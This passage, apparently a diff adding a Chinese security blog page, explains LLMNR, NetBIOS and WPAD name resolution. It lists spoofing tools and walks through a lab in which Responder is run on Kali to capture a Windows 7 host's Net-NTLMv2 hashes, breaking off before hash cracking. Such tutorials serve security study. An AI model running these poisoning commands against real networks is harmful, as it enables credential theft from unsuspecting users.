@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+<html lang="en-us" class="light">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.118.2">
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="generator" content="Saber v0.11.2">
+    <meta name="author" content="F0rmat" />
+    <meta name="keywords" content="专注于信息安全、内网渗透、红队攻防" />
+    <meta name="og:site_name" content="F0rmat&#39;s Blog" />
+    <link rel="canonical" href="https://xxe.icu/llmnr_nbt-ns.html" /><meta property="og:type" content="article" />
+    <meta property="title" content="LLMNR/NBT-NS欺骗攻击 - F0rmat&#39;s Blog">
+    <meta property="og:title" content="LLMNR/NBT-NS欺骗攻击 - F0rmat&#39;s Blog">
+    <meta property="twitter:title" content="LLMNR/NBT-NS欺骗攻击 - F0rmat&#39;s Blog">
+    <meta name="description" content="0x00 基本概念 LLMNR＆NBT-NS欺骗攻击可以作为我们内网渗透中的一种手法，主要是利用LLMNR、NetBIOS和WPAD机制进行的中间人攻">
+    <meta property="og:description" content="0x00 基本概念 LLMNR＆NBT-NS欺骗攻击可以作为我们内网渗透中的一种手法，主要是利用LLMNR、NetBIOS和WPAD机制进行的中间人攻">
+    <meta property="twitter:description" content="0x00 基本概念 LLMNR＆NBT-NS欺骗攻击可以作为我们内网渗透中的一种手法，主要是利用LLMNR、NetBIOS和WPAD机制进行的中间人攻">
+    <meta property="og:type" content="article">
+    <title>LLMNR/NBT-NS欺骗攻击 - F0rmat&#39;s Blog</title>
+
+    <meta property="og:url" content="https://xxe.icu/llmnr_nbt-ns.html" />
+
+    
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <meta property="twitter:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/16066632?v=4" type="image/x-png" />
+    
+      
+      <link rel="stylesheet" href="/css/main.min.dbdd30bb57b959228eef6e0f4a297b76d6edfad348d99701f8d68535ea50105a.css" integrity="sha256-290wu1e5WSKO724PSil7dtbt+tNI2ZcB+NaFNepQEFo="/>
+    
+    
+  <link rel="stylesheet" href="/css/syntax.css"/>
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1607597_jhmihcvh0tm.css" />
+    <link href="/index.xml" rel="alternate" type="application/rss+xml" title="F0rmat&#39;s Blog">
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</head>
+
+<body class="bg-gray-100 dark:bg-gray-700 text-gray-900 dark:text-gray-100 tracking-wider leading-normal">
+
+    <nav id="header" class="bg-white dark:bg-gray-800 fixed w-full z-10 top-0 shadow">
+
+  <div id="progress" class="h-1 z-20 top-0" style="background:linear-gradient(to right, #4dc0b5 var(--scroll), transparent 0);"></div>
+
+  <div class="w-full container mx-auto flex flex-wrap items-center justify-between my-1">
+      <div class="pl-4">
+          <a class="text-base no-underline hover:no-underline font-bold"  href="/">
+              F0rmat&#39;s Blog
+          </a>
+      </div>
+
+      <div class="block lg:hidden pr-4">
+          <button id="nav-toggle" class="flex items-center px-3 py-2 border rounded text-gray-500 border-gray-600 hover:text-gray-900 hover:border-teal-500 appearance-none focus:outline-none">
+              <svg class="fill-current h-3 w-3" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><title>Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z"/></svg>
+          </button>
+      </div>
+
+      <div class="w-full flex-grow lg:flex lg:items-center lg:w-auto hidden mt-2 lg:mt-0 bg-gray-100 dark:bg-gray-800 md:bg-transparent z-20" id="nav-content">
+          <ul class="list-none lg:flex justify-end flex-1 items-center">
+                    <li class="mr-3">
+                    <a href="/" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">HOME</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/posts.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ARCHIVE</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/about.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ABOUT</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/atom.xml" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">RSS</a>
+                    </li>
+                <button id="switchTheme" class="h-10 w-10 flex justify-center items-center focus:outline-none">
+                    <div id="dark-icon" class="hidden">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Dark Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
+                    </div>
+                    <div id="light-icon">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Light Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+                    </div> 
+                </button>
+          </ul>
+      </div>
+  </div>
+</nav>
+
+    <div id="container" class="container w-full flex flex-wrap mx-auto px-2 lg:pt-12 mt-10">
+<section class="w-full lg:w-3/4 xl:w-3/4">
+
+    
+    <div class="px-8 py-6 mt-6 lg:mt-0 leading-normal rounded shadow bg-white dark:bg-gray-800">
+
+        
+        <div>
+    <h1 class="font-bold break-normal text-gray-800 pt-2 pb-2 text-2xl lg:text-3xl dark:text-gray-200">
+        <a href="https://xxe.icu/llmnr_nbt-ns.html" title="LLMNR/NBT-NS欺骗攻击">LLMNR/NBT-NS欺骗攻击</a>
+    </h1>
+    <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
+        <span title=" 2022-02-12 11:04:34 CST">
+            <i class="iconfont icon-calendar" aria-hidden="true"></i> 12 Feb 2022
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-book"></i>
+            5083 字
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-clock-o"></i>
+            11 分钟读完
+        </span>
+    </p>
+</div>
+
+
+        <div class="md:hidden dark:text-gray-100">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-基本概念">0x00 基本概念</a>
+      <ul>
+        <li><a href="#llmnr">LLMNR</a>
+          <ul>
+            <li><a href="#包头结构">包头结构</a></li>
+          </ul>
+        </li>
+        <li><a href="#netbios">NetBIOS</a>
+          <ul>
+            <li><a href="#服务">服务</a></li>
+            <li><a href="#名称服务">名称服务</a></li>
+            <li><a href="#节点类型">节点类型</a></li>
+          </ul>
+        </li>
+        <li><a href="#wpad">WPAD</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x01-工作原理">0x01 工作原理</a></li>
+    <li><a href="#0x02-攻击工具">0x02 攻击工具</a>
+      <ul>
+        <li><a href="#nbnspoof---netbios-name-service-spoofer">NBNSpoof - NetBIOS Name Service Spoofer</a></li>
+        <li><a href="#llmnr_response">llmnr_response</a></li>
+        <li><a href="#responder">Responder</a></li>
+        <li><a href="#inveigh">Inveigh</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-攻击实战">0x03 攻击实战</a>
+      <ul>
+        <li><a href="#捕获net-ntlmv2">捕获Net-NTLMv2</a>
+          <ul>
+            <li><a href="#主要的工作流程">主要的工作流程</a></li>
+            <li><a href="#实战">实战</a></li>
+          </ul>
+        </li>
+        <li><a href="#捕获http明文">捕获HTTP明文</a></li>
+        <li><a href="#利用wpad攻击获取系统权限">利用WPAD攻击获取系统权限</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x04-防御">0x04 防御</a>
+      <ul>
+        <li><a href="#关闭llmnr">关闭LLMNR</a></li>
+        <li><a href="#关闭netbios">关闭NetBIOS</a></li>
+        <li><a href="#修复结果">修复结果</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x05-参考">0x05 参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div> 
+
+        <div class="post-content dark:text-gray-300">
+            <h1 id="0x00-基本概念">0x00 基本概念</h1>
+<p>LLMNR＆NBT-NS欺骗攻击可以作为我们内网渗透中的一种手法，主要是利用LLMNR、NetBIOS和WPAD机制进行的中间人攻击获取到NTLMv2凭证或者HTTP认证明文和目标系统的权限，下面我们先来了解一下这几个功能的基本概念。</p>
+<h2 id="llmnr">LLMNR</h2>
+<p><strong>链路本地多播名称解析</strong>( <strong>LLMNR</strong> ) 是一种基于域名系统数据包格式的协议，它允许IPv4和IPv6主机为同一本地链路上的主机执行名称解析。</p>
+<h3 id="包头结构">包头结构</h3>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/1.png" alt="1"></p>
+<ul>
+<li>ID - 由生成任何类型查询的程序分配的 16 位标识符。</li>
+<li>QR - 查询/响应。</li>
+<li>OPCODE - 一个 4 位字段，指定此消息中的查询类型。此值由查询的发起者设置并复制到响应中。本规范定义了标准查询和响应的行为（操作码值为零）。未来的规范可能会定义其他操作码与 LLMNR 的使用。</li>
+<li>C - 冲突。</li>
+<li>TC - 截断。</li>
+<li>T - 暂定。</li>
+<li>Z - 保留供将来使用。</li>
+<li>RCODE - 响应代码。</li>
+<li>QDCOUNT - 一个无符号 16 位整数，指定问题部分中的条目数。</li>
+<li>ANCOUNT - 一个无符号的 16 位整数，指定答案部分中的资源记录数。</li>
+<li>NSCOUNT - 一个无符号的 16 位整数，指定权限记录部分中名称服务器资源记录的数量。</li>
+<li>ARCOUNT - 一个无符号 16 位整数，指定附加记录部分中的资源记录数。</li>
+</ul>
+<h2 id="netbios">NetBIOS</h2>
+<p><strong>NetBIOS</strong> 是<strong>Network Basic Input/Output System</strong>的首字母缩写词。它提供与OSI 模型的会话层相关的服务，允许不同计算机上的应用程序通过局域网进行通信。作为严格的API，NetBIOS 不是网络协议。NetBIOS 也用于识别 TCP/IP(Windows) 中的系统名称。简单地说，它是一种允许在局域网中通过 OSI 模型的会话层进行文件和打印机通信的协议。</p>
+<h3 id="服务">服务</h3>
+<p>NetBIOS 提供三种不同的服务：</p>
+<ul>
+<li>用于名称注册和解析的名称服务 (NetBIOS-NS) 。</li>
+<li>用于无连接通信的数据报分发服务 (NetBIOS-DGM)。</li>
+<li>面向连接通信的会话服务 (NetBIOS-SSN) 。</li>
+</ul>
+<blockquote>
+<p>SMB是上层，是运行在 Session Service 和 Datagram 服务之上的服务，不要混淆为 NetBIOS 本身的必要组成部分。现在它可以运行在 TCP 之上，只需要一个小为每个 SMB 消息添加数据包长度的适配层；这是必要的，因为 TCP 仅提供字节流服务，没有数据包边界的概念。</p>
+</blockquote>
+<h3 id="名称服务">名称服务</h3>
+<p>为了启动会话或分发数据报，应用程序必须使用名称服务注册其 NetBIOS 名称。NetBIOS 名称的长度为 16 个八位字节，并且根据特定的实现而有所不同。通常，称为 NetBIOS 后缀的第 16 个八位字节指定资源的类型，并可用于告诉其他应用程序系统提供的服务类型。在NBT中，名称服务在 UDP 端口 137 上运行（也可以使用 TCP 端口 137，但很少使用）。</p>
+<p>NetBIOS 提供的名称服务原语是：</p>
+<ul>
+<li>添加名称——注册一个 NetBIOS 名称。</li>
+<li>添加组名——注册一个 NetBIOS“组”名。</li>
+<li>删除名称 - 取消注册 NetBIOS 名称或组名称。</li>
+<li>查找名称 - 在网络上查找 NetBIOS 名称。</li>
+</ul>
+<p>Microsoft 不支持<a href="https://en.wikipedia.org/wiki/IPv6">Internet 协议版本 6 (IPv6)</a>的 NetBIOS 名称解析。</p>
+<h3 id="节点类型">节点类型</h3>
+<p>在 Windows 下，联网计算机的<strong>节点类型</strong>与其将 NetBIOS 名称解析为IP 地址的方式有关。这假定 NetBIOS 节点有任何 IP 地址，只有当 NetBIOS 在 NBT 上运行时才能保证；因此，节点类型不是 NetBIOS 本身的属性，而是 Windows OS 环境中 NetBIOS 和 TCP/IP 之间交互的属性。有四种节点类型。</p>
+<ul>
+<li>B节点：0x01广播</li>
+<li>P 节点：0x02 对等点（仅限 WINS）</li>
+<li>M节点：0x04混合（广播，然后WINS）</li>
+<li>H节点：0x08 Hybrid（WINS，然后广播）</li>
+</ul>
+<h2 id="wpad">WPAD</h2>
+<p><strong>Web 代理自动发现 (WPAD) 协议</strong>是组织允许员工通过代理服务器访问互联网，以提高性能、确保安全和跟踪流量。连接到公司网络的用户需要知道特定 URL 的代理服务器，客户端使用 DHCP 和/或 DNS 发现方法来定位配置文件的 URL 的一种方法。 一旦配置文件的检测和下载完成，就可以执行它来确定指定 URL 的代理。在IE在网络设置打勾就表示启用了wpad，默认是不开启的，但是在 Windows 10 中WPAD 默认是启用的：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/2.png" alt="2"></p>
+<h1 id="0x01-工作原理">0x01 工作原理</h1>
+<p>我们要明白LLNBR(UDP/5355)和NetBIOS(UDP/137) 两者的区别，其实这两个都是用于名称解析的，NetBIOS是从Windows 2000开始启用的，LLNNR是作为windows Vista以上的系统开始启用的协议，还有就是NetBIOS是Windows进行通信的API，LLMNR是网络协议，但是两者主要功能是一样的。在系统进行名称解析会进行以下的步骤：</p>
+<ol>
+<li>检查以确认请求是否针对本地计算机名称。</li>
+<li>检查最近成功解析的名称的本地缓存。</li>
+<li>搜索本地hosts文件当中解析。</li>
+<li>查询 DNS 服务器。</li>
+<li>如果启用了 LLMNR，则在本地子网中广播 LLMNR 查询以请求其对等方进行解析。</li>
+<li>如果启用了 NetBIOS，如果名称不在本地 NetBIOS 缓存中，则尝试通过向本地子网广播 NetBIOS-NS 查询来解析 NetBIOS 名称。如果这样配置，此步骤可能会使用 Windows Internet 名称服务 (WINS) 服务器以及 LAN 管理器主机 (LMHOSTS) 文件。</li>
+</ol>
+<p>也就是说当我们在使用名称查找主机的时候(使用win+R，输入\\errorhost)，会执行上面的步骤，所以总的来说只有当我们输入计算机和DNS服务器不存在的主机名称的时候才会触发LLMNR和NetBIOS，笔者感觉这个漏洞还是有局限性的，所以在内网渗透中用的不是很多。</p>
+<h1 id="0x02-攻击工具">0x02 攻击工具</h1>
+<h2 id="nbnspoof---netbios-name-service-spoofer">NBNSpoof - NetBIOS Name Service Spoofer</h2>
+<p>NBNSpoof 是一种用于自动制作对 NetBIOS 名称服务 (NBNS) 名称查询的响应的工具。当 Windows 机器无法通过 DNS 和 WINS 解析域名时，它们将发送广播 NBNS 查询以查看有问题的名称是否与本地网络上的任何计算机名称匹配。在受害者错误键入域名或 DNS 服务器无法访问的情况下，对这些请求做出响应对攻击者特别有用。</p>
+<p>下载地址：</p>
+<p><a href="https://github.com/nomex/nbnspoof">https://github.com/nomex/nbnspoof</a></p>
+<p>使用方法：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nbnspoof.py [-v] -i &lt;interface&gt; -n &lt;regexp&gt; -h &lt;ip address&gt; -m &lt;MAC&gt; [-p &lt;ip address&gt;]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-v Verbose output of sniffed NBNS name queries, and responses sent
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-i The interface you want to sniff and send on
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-n A regular expression applied to each query to determine whether a
+</span></span><span class="line"><span class="cl">   spoofed response will be sent
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-h The IP address that will be sent in spoofed responses
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-p (optional) The IP address of the victim (if unset, pwn all)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-m The source MAC address for spoofed responses
+</span></span></code></pre></div><h2 id="llmnr_response">llmnr_response</h2>
+<p>这是一款在msf中使用的工具。利用方法如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msf &gt; use auxiliary/spoof/llmnr/llmnr_response
+</span></span><span class="line"><span class="cl">msf auxiliary(llmnr_response) &gt; show actions
+</span></span><span class="line"><span class="cl">    ...actions...
+</span></span><span class="line"><span class="cl">msf auxiliary(llmnr_response) &gt; set ACTION &lt; action-name &gt;
+</span></span><span class="line"><span class="cl">msf auxiliary(llmnr_response) &gt; show options
+</span></span><span class="line"><span class="cl">    ...show and set options...
+</span></span><span class="line"><span class="cl">msf auxiliary(llmnr_response) &gt; run
+</span></span></code></pre></div><h2 id="responder">Responder</h2>
+<p>Responder是一款很强大的中间人利用工具，也是本文中实践使用的工具，主要的功能有双 IPv6/IPv4 堆栈、内置 SMB 身份验证服务器、内置 MSSQL 身份验证服务器、内置 HTTP 身份验证服务器、内置 HTTPS 身份验证服务器、内置 LDAP 身份验证服务器、内置 DCE-RPC 身份验证服务器、内置 FTP、POP3、IMAP、SMTP Auth 服务器、内置DNS服务器、内置 WPAD 代理服务器、浏览器监听器、指纹识别、Icmp 重定向、DHCP欺骗、分析模式。</p>
+<p>下载地址：</p>
+<p><a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p>
+<p>使用方法：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">--version             show program&#39;s version number and exit
+</span></span><span class="line"><span class="cl">-h, --help            show this help message and exit
+</span></span><span class="line"><span class="cl">-A, --analyze         Analyze mode. This option allows you to see NBT-NS,
+</span></span><span class="line"><span class="cl">                    BROWSER, LLMNR requests without responding.
+</span></span><span class="line"><span class="cl">-I eth0, --interface=eth0
+</span></span><span class="line"><span class="cl">                    Network interface to use, you can use &#39;ALL&#39; as a
+</span></span><span class="line"><span class="cl">                    wildcard for all interfaces
+</span></span><span class="line"><span class="cl">-i 10.0.0.21, --ip=10.0.0.21
+</span></span><span class="line"><span class="cl">                    Local IP to use (only for OSX)
+</span></span><span class="line"><span class="cl">-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
+</span></span><span class="line"><span class="cl">                    Poison all requests with another IPv6 address than
+</span></span><span class="line"><span class="cl">                    Responder&#39;s one.
+</span></span><span class="line"><span class="cl">-e 10.0.0.22, --externalip=10.0.0.22
+</span></span><span class="line"><span class="cl">                    Poison all requests with another IP address than
+</span></span><span class="line"><span class="cl">                    Responder&#39;s one.
+</span></span><span class="line"><span class="cl">-b, --basic           Return a Basic HTTP authentication. Default: NTLM
+</span></span><span class="line"><span class="cl">-d, --DHCP            Enable answers for DHCP broadcast requests. This
+</span></span><span class="line"><span class="cl">                    option will inject a WPAD server in the DHCP response.
+</span></span><span class="line"><span class="cl">                    Default: False
+</span></span><span class="line"><span class="cl">-D, --DHCP-DNS        This option will inject a DNS server in the DHCP
+</span></span><span class="line"><span class="cl">                    response, otherwise a WPAD server will be added.
+</span></span><span class="line"><span class="cl">                    Default: False
+</span></span><span class="line"><span class="cl">-w, --wpad            Start the WPAD rogue proxy server. Default value is
+</span></span><span class="line"><span class="cl">                    False
+</span></span><span class="line"><span class="cl">-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
+</span></span><span class="line"><span class="cl">                    Upstream HTTP proxy used by the rogue WPAD Proxy for
+</span></span><span class="line"><span class="cl">                    outgoing requests (format: host:port)
+</span></span><span class="line"><span class="cl">-F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
+</span></span><span class="line"><span class="cl">                    retrieval. This may cause a login prompt. Default:
+</span></span><span class="line"><span class="cl">                    False
+</span></span><span class="line"><span class="cl">-P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
+</span></span><span class="line"><span class="cl">                    authentication for the proxy. WPAD doesn&#39;t need to be
+</span></span><span class="line"><span class="cl">                    ON. This option is highly effective when combined with
+</span></span><span class="line"><span class="cl">                    -r. Default: False
+</span></span><span class="line"><span class="cl">--lm                  Force LM hashing downgrade for Windows XP/2003 and
+</span></span><span class="line"><span class="cl">                    earlier. Default: False
+</span></span><span class="line"><span class="cl">--disable-ess         Force ESS downgrade. Default: False
+</span></span><span class="line"><span class="cl">-v, --verbose         Increase verbosity.
+</span></span></code></pre></div><h2 id="inveigh">Inveigh</h2>
+<p>IInveigh 通过数据包嗅探和协议特定的 isteners/sockets 进行欺骗攻击和哈希/凭证捕获。作为该工具原始 Powershell 版本的基础的数据包嗅探方法具有以下优点：</p>
+<ul>
+<li>通过 Window 的 SMB 服务捕获 SMB NTLM 质询/响应</li>
+<li>主机系统上更少的可见端口绑定</li>
+</ul>
+<p>主要缺点是需要提升访问权限。</p>
+<p>在当前版本的 Windows 上，默认运行的 UDP 服务允许端口重用。因此，数据包嗅探不再为绕过正在使用的 UDP 端口提供优势。Inveigh 的 UDP 侦听器都配置为利用端口重用。</p>
+<p>下载地址：https://github.com/Kevin-Robertson/Inveigh.git</p>
+<h1 id="0x03-攻击实战">0x03 攻击实战</h1>
+<h2 id="捕获net-ntlmv2">捕获Net-NTLMv2</h2>
+<h3 id="主要的工作流程">主要的工作流程</h3>
+<p>如下图所示，受害者在网络中寻找filesrvr这个主机(因为少打了一个e)，先去询问DNS服务器，如果不知道就会去内网中广播谁是filesrvr，攻击者就会设置一个监听，假装回应说他就是filesrvr，中间就会发出获取hash信号，当攻击者收到后机会返回错误的信息给受害者：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/3.png" alt="3"></p>
+<h3 id="实战">实战</h3>
+<p>实战我们是使用一台受害者Windows 7(172.16.0.105)，一台攻击者Kali Linux (172.16.0.107)，Responder工具是kali自带的，所以直接在kali执行responder即可。</p>
+<p>在Kali上面执行以下命令，记得是以sudo方式执行,f是指获取指纹，v是详情：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>/usr/share/responder<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo responder -I eth0 -fv                                                                                                                                                                                                                                                              
+</span></span><span class="line"><span class="cl">                                         __
+</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.0.7.0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoners:
+</span></span><span class="line"><span class="cl">    LLMNR                      <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    NBT-NS                     <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DNS/MDNS                   <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DHCP                       <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Servers:
+</span></span><span class="line"><span class="cl">    HTTP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    HTTPS server               <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    WPAD proxy                 <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Auth proxy                 <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    SMB server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Kerberos server            <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    SQL server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    FTP server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    IMAP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    POP3 server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    SMTP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DNS server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    LDAP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    RDP server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DCE-RPC server             <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    WinRM server               <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> HTTP Options:
+</span></span><span class="line"><span class="cl">    Always serving EXE         <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Serving EXE                <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Serving HTML               <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Upstream Proxy             <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoning Options:
+</span></span><span class="line"><span class="cl">    Analyze Mode               <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force WPAD auth            <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force Basic Auth           <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force LM downgrade         <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force ESS downgrade        <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Fingerprint hosts          <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Generic Options:
+</span></span><span class="line"><span class="cl">    Responder NIC              <span class="o">[</span>eth0<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder IP               <span class="o">[</span>172.16.0.107<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Challenge <span class="nb">set</span>              <span class="o">[</span>random<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Don<span class="s1">&#39;t Respond To Names     [&#39;</span>ISATAP<span class="err">&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current Session Variables:
+</span></span><span class="line"><span class="cl">    Responder Machine Name     <span class="o">[</span>WIN-OVB356BIVFL<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder Domain Name      <span class="o">[</span>OATW.LOCAL<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder DCE-RPC Port     <span class="o">[</span>45303<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
+</span></span></code></pre></div><p>然后我们在Windows 7中使用Win+r打开运行窗口，随便输入一个错误的主机名称：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/4.png" alt="4"></p>
+<p>我们再回来已经能看到获取到了Net-NTLMv2：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/5.png" alt="5"></p>
+<p>关于Net-NTLMv2和LM的区别可以看文章<a href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">LM, NTLM, Net-NTLMv2</a></p>
+<p>我们可以使用kali自带的John活着hashcat工具进行破解,我们把下面一段保存为hash.txt:</p>
